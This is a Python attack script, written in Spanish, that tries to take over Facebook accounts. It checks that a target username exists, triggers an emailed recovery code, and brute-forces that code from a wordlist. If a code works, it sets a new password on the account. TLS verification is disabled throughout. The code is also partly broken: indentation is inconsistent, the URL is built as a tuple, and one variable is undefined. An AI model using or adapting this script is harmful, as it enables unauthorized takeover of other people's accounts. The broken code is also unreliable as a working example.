#-*- coding: utf-8 -*-
import sys
import re
import time
import os
import random
import time

try:
    import requests

except ImportError:
    print ("[!] Couldn't import requests")
    sys.exit()


s = requests.Session()
s.headers["User-Agent"] = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; Google Wireless Transcoder"
s.headers['Content-type']= "application/x-www-form-urlencoded"


def Sistema():
	if os.name == "nt":
		os.system('cls')
	else:
		os.system('clear')

def logo():
	banner = """                        
	     _            ____            ___   _  _  
	    / \    _ __  /  __| ___  ___ /   \ | \/ | 
	   / _ \  | '_ \ \__ \ / _ \/  _|| | |  \  /  
	  / ___ \ | | | | __| |  __/| |_ | | |  /  \  
	 /_/   \_\|_| |_||____/\___|\___|\___/ |_/\_| """
	print (banner)

def menu(s):
	print("\n")
	menu="""Menu Ataque - Facebook recovery: 
   	[1]: Lanzar Ataque - Decifrar Codigo
   	[2]: Ingresar Codigo de decifrado

	Codigo By Ansec0x
	"""
	print (menu)
	try:
	    opcion= input("\033[0;32mMenu Opcion:  \033[0m")
	    opcion = int(opcion)
	    if opcion==1:
	        diccionario=input("Ingrese Diccionario: ")
		diccionario="password.txt"

		with open(diccionario,'r') as f:
			password=f.read().splitlines()
		cont=len(password)
		print ("[+]Encontrad Wordlist: {}".format(cont))

		for crack in range(cont):
			passwordRecovery(s,crack)
	    if opcion==2:
	        clave_decifrada=input("Ingrese Codigo Decifrado: ")
		passwordRecovery(s,crack)

	except ValueError:
	    pass


def cambiarPassword(s,clave_decifrada,cod_usu,new_password):
	url="https://www.facebook.com/recover/password?u=",cod_usu,"&n=",clave_decifrada

	res=s.get(url).text
	params = {'lsd': None, 'm_ts': None, 'pxr': None, 'li': None, 'width': None, 'ajax': None, 'version': None, 'gps': None, 'charset_test': None}
	for p in params.keys():
    		match = re.search(r'name="place_holder" value="(.*?)"'.replace("place_holder", p), res)
    		if match:
       			params[p] = match.group(1)
	params['password_new'] = new_password
	params['password_confirm'] = new_password
	params['btn_continue'] = 'Continuar'

	cam=s.post(url,data=params,verify=False)

	if 'https://www.facebook.com/password/change/reason/' in cam.text:
		print ("Se cambio el Password Exitosamente")
	else:
		print ("Password No Cambiado, Ingrese Password Numeros y letras");



def passwordRecovery(s,clave):
	res=s.get("https://m.facebook.com/recover/code").text
	params = {'lsd': None, 'm_ts': None, 'pxr': None, 'li': None, 'width': None, 'ajax': None, 'version': None, 'gps': None, 'charset_test': None}
	for p in params.keys():
    		match = re.search(r'name="place_holder" value="(.*?)"'.replace("place_holder", p), res)
    		if match:
       			params[p] = match.group(1)
	params['n'] = clave
	params['reset_action'] = 'Continuar'

	rrrr=s.post("https://m.facebook.com/recover/code",data=params,verify=False)
	if 'Vuelve a intentarlo' in rrrr.text:
		print ("Password ",clave," Incorrecto")

	elif '/recover/password' in rrrr.text:
		print ("[+]Password Correcto: ",clave,"\n\n\n")
		codigo_usuario=input("Ingrese codigo de Usuario: ")
		new_password=input("Ingrese Nuevo Pasword a cambiar: ")
		cambiarPassword(s,clave,codigo_usuario,new_password)
		sys.exit()
	elif 'Control de seguridad' in rrrr.text:
		print ("Intentelo Mas Tarde [Codigo_Seguridad]")
		sys.exit()
	elif 'Ingresaste solo 2' in rrrr.text:
		print ("Error de Diccionario... solo se ingresa 2 numeros")
	else:
		print ("Ataque no response")
		


def verificarEmail(s):
	res=s.get("https://m.facebook.com/recover/initiate").text
	params = {'lsd': None, 'm_ts': None, 'pxr': None, 'li': None, 'width': None, 'ajax': None, 'version': None, 'gps': None, 'charset_test': None}
	for p in params.keys():
    		match = re.search(r'name="place_holder" value="(.*?)"'.replace("place_holder", p), res)
    		if match:
       			params[p] = match.group(1)
	params['recover_method'] = 'send_email'
	params['reset_action'] = 'Continuar'
	
	rrr=s.post("https://m.facebook.com/recover/initiate/",data=params,verify=False)
	
	if '/recover/code' in rrr.text:
		print ("[+]El codigo a sido enviado al correo")
		print ("[+]Esta Listo para el ataque!")
	elif 'Control de seguridad' in rrr.text:
		print ("Intentelo Mas Tarde [Codigo_Seguridad]")
		sys.exit()
	else:
		print ("No response")
		sys.exit()


def verificarUsuario(s, username):
    time.sleep(0.2)
    r = s.get("https://m.facebook.com/{}".format(username))
    if r.status_code==200:
       	return True
    if r.status_code==404:
       	return False

Sistema()
logo()
print ("\n\n\n")
usuario=input("Ingrese Usuario: ")
if verificarUsuario(s,usuario):
	correo=usuario
	print ("[+]Usuario Correcto")
	time.sleep(10)
	print ("[-]Verificando Acceso...")
else:
	print("[!]Usuario Invalido")
	sys.exit()



data = s.get("https://m.facebook.com/login/identify/?ctx=recover&c&_rdr").text
params = {'lsd': None, 'm_ts': None, 'pxr': None, 'li': None, 'width': None, 'ajax': None, 'version': None, 'gps': None, 'charset_test': None}
for p in params.keys():
    	match = re.search(r'name="place_holder" value="(.*?)"'.replace("place_holder", p), data)
    	if match:
       		params[p] = match.group(1)
params['email'] = "webshell.hacking@gmail.com"
params['did_submit'] = 'Buscar'

r=s.post("https://m.facebook.com/login/identify/?ctx=recover",data=params,verify=False)

if '/recover/initiate' not in r.text:
	print("[!]Fracasado")
	sys.exit()
else:
	print ("[-]Confirmando Email...")

verificarEmail(s)

menu(s)



